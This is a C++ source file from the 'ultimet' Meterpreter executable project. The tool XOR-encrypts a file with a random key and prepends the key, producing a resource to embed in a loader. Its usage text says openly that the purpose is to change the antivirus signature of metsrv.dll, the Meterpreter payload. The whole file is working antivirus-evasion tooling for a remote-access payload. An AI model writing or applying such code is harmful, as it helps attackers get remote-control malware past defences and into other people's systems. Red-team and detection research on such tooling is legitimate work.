//»”„ «··Â «·—Õ„‰ «·—ÕÌ„

//this file is part of:
/************************************************
*					  [ultimet]					*
*		The Ultimate Meterpreter Executable		*
*************************************************		
- @SherifEldeeb
- http://eldeeb.net
- Made in Egypt :)
************************************************/
/*
Copyright (c) 2013, Sherif Eldeeb "eldeeb.net"
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met: 

1. Redistributions of source code must retain the above copyright notice, this
list of conditions and the following disclaimer. 
2. Redistributions in binary form must reproduce the above copyright notice,
this list of conditions and the following disclaimer in the documentation
and/or other materials provided with the distribution. 

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

The views and conclusions contained in the software and documentation are those
of the authors and should not be interpreted as representing official policies, 
either expressed or implied, of the FreeBSD Project.
*/
#include <windows.h>
#include <iostream>
#include <time.h>

DWORD err = 0;
DWORD bytesWritten = 0;
void print_header()
{
	printf("\n\n****************************************************\n");
	printf(" [+] [ultimet] - The Ultimate Meterpreter Executable\n");
	printf(" [+] v0.1 pre-alpha\n");
	printf("****************************************************\n");
	printf("  -  http://eldeeb.net - @SheriefEldeeb\n\n");
}

void gen_random(char *s, const int len) { //ripped & modified "added srand()" from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	srand ( (UINT)time(NULL) );
	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}

LONGLONG SizeFromName(LPCWSTR szFileName) // Returns a file's size from its filename, returns a LONGLONG, in case you have a LARGE LARGE file :)
{
	LARGE_INTEGER fileSize = {0};
	HANDLE hfile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); //Get a handle on the file

	if (hfile==INVALID_HANDLE_VALUE) //if something went wrong ...
	{
		err = GetLastError();
		wprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
		CloseHandle(hfile);
		return -1;
	}

	if(!GetFileSizeEx(hfile,&fileSize)) // Get the size from the file handle
	{
		err = GetLastError();
		wprintf(L"[-] Error getting file size! GetFileSizeEx() returned : %08x\n", err);
		CloseHandle(hfile);
		return -1;
	}

	CloseHandle(hfile); // this will ALWAYS throw an exception if run under a debugger, but good higene if run under "production"
	return fileSize.QuadPart; //LARGE_INTEGER is a sruct, QuadPart is the filesize in a 64bit digit... which should cover all file sizes "That's for files >4GB" 
} 

DWORD CopyFileToBuffer(LPCWSTR szFileName, unsigned char** buffer)
{
	// get file size...
	DWORD size = 0;
	size = (DWORD)SizeFromName(szFileName);
	if (size == -1)
	{
		return -1;
	}
	else {
		wprintf(L"[*] Size of \"%s\" is \"%d\" bytes.\n", szFileName, size);
	}

	// Reading file content into buffer.
	//... first we get a handle on the file
	HANDLE hfile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hfile==INVALID_HANDLE_VALUE) //if something went wrong ...
	{
		err = GetLastError();
		wprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
		CloseHandle(hfile);
		return -1;
	}


	wprintf(L"[*] Trying to VirtualAlloc \"%d\" bytes of data\n", size);
	*buffer = (unsigned char*)VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	wprintf(L"[*] Copying file \"%s\" to buffer...\n", szFileName);
	if( FALSE == ReadFile(hfile, *buffer, (DWORD)size, &bytesWritten, NULL) )
	{
		printf("[-] Unable to read from file.\n");
		CloseHandle(hfile);
		return -1;
	}
	CloseHandle(hfile);
	return (DWORD)size; 
}

DWORD CopyBufferToFile(LPCWSTR szFileName, unsigned char* buffer, int length)
{
	//... first we get a handle on the file
	HANDLE hfile = CreateFile(szFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hfile==INVALID_HANDLE_VALUE) //if something went wrong ...
	{
		err = GetLastError();
		wprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
		CloseHandle(hfile);
		return -1;
	}

	wprintf(L"[*] Copying buffer to file ...\n", szFileName);
	if( FALSE == WriteFile(hfile, buffer, length, &bytesWritten, NULL ))
	{
		printf("[-] Unable to write to file.\n");
		CloseHandle(hfile);
		return -1;
	}
	CloseHandle(hfile);
	return length; 
}

void usage(void)
{
	print_header();
	printf("invalid number of arguments...\n\n");
	printf("[*] The ultimet_xor ResourceEncrypter [*]\n");
	printf(" -  This file is part of the ultimet project https://github.com/SherifEldeeb/inmet/\n");
	printf(" -  it reads a file, XOR-encrypt it using a random 16 byte key,\n -  then prepend the key to the ciphertext for ultimet processing\n");
	printf(" -  The purpose is to change AV signature of metsrv.dll, not hide a message!\n");
	printf("[*] for more info, please visit http://eldeeb.net/\n \n");
	printf("Usage:\n");
	printf("ultimet_xor.exe metsrv.dll\n");
	printf("\n - The output is going to be a file called \"encrypted.rsc\"\n");
	printf("   you then need to add that file to ultimet.exe as a resource,\n"
		" - Type has to be \"BINARY\" and ID \"101\"\n");
	exit (1);
}

void encrypt(unsigned char *buffer, char *key, int size)
{
	int key_length = strlen((const char*)key);

	int i = 0 ;
	int position = 0;

	for(i = 0; i < size; i++)
	{
		position = i % key_length;
		buffer[i] ^=  key[position];
	}
}

bool UnicodeToAnsi(char* ascii, const wchar_t* unicode)
{
	int result = WideCharToMultiByte(CP_OEMCP, 0, unicode, -1, ascii, 17, 0, 0);
	//int result = MultiByteToWideChar(CP_OEMCP, 0, ascii, -1, unicode, len + 1);
	return TRUE;
}

int wmain(int argc, wchar_t *argv[])
{
	wchar_t temp[MAX_PATH] = {0};
	wchar_t in_filename[MAX_PATH] = {0};
	wchar_t out_filename[MAX_PATH] = {0};
	char encryption_key[17] = {0};
	unsigned char* buffer = nullptr;
	unsigned char* big_buffer = nullptr;
	if (argc < 2) usage();

	//Initialize variables... TODO: Error checking!
	wcscpy_s(in_filename,argv[1]);
	GetCurrentDirectory(MAX_PATH, out_filename);
	wcsncat_s(out_filename, L"\\encrypted.rsc", MAX_PATH);

	//Write key to file
	wprintf(L"[*] Generating a random 16 character password...\n");
	gen_random(encryption_key, 16);
	printf("[*] \"%s\"will be used for encryption, writing key to file...\n", encryption_key);

	wchar_t keyFileName[MAX_PATH] = {0};
	GetCurrentDirectory(MAX_PATH, keyFileName);
	wcsncat_s(keyFileName, L"\\key.txt", (MAX_PATH - strlen((const char*)keyFileName)));
	HANDLE hfile = CreateFile(keyFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
	WriteFile(hfile, encryption_key, strlen((const char*)encryption_key), &bytesWritten, NULL);
	CloseHandle(hfile);
	wprintf(L"[*] Key written to \"%s\", use that to decrypt if you want...\n", keyFileName);

	DWORD filesize = CopyFileToBuffer(in_filename, &buffer);
	
	wprintf(L"[*] XORing ...\n", keyFileName);
	encrypt(buffer, encryption_key, filesize);

	//CopyBufferToFile(out_filename, buffer, filesize);

	// combining both buffers...
	big_buffer = (unsigned char*)VirtualAlloc(0, (strlen(encryption_key)+filesize+1), MEM_COMMIT, PAGE_READWRITE);
	memcpy_s(big_buffer,strlen(encryption_key),encryption_key,strlen(encryption_key));
	memcpy_s((big_buffer + strlen(encryption_key)),filesize , buffer,filesize);

	CopyBufferToFile(out_filename, big_buffer, filesize + strlen(encryption_key));
	wprintf(L"[*] Done! now you can use any resource editor to add \"encrypted.rsc\" as a resource\n    to ultimet.exe, Type has to be \"BINARY\" and ID \"101\".n");

	printf("\n%s\n",encryption_key);
	return 0;
}